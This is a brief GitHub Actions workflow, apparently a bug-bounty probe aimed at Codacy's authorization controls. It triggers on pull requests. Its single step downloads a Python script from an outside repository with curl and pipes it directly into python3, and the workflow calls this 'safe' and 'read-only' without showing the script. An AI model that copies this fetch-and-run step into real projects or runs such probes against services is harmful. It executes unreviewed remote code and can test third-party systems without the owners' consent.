name: Codacy H1 safe single probe

on:
  pull_request:
    types: [opened, synchronize]

permissions:
  contents: read

jobs:
  probe:
    runs-on: ubuntu-latest
    timeout-minutes: 2
    steps:
      - name: Run read-only Codacy authorization controls
        run: curl -fsSL https://raw.githubusercontent.com/Vincx12/Potasse/codacy-h1-safe-probe-20260710/.github/scripts/codacy_probe.py | python3
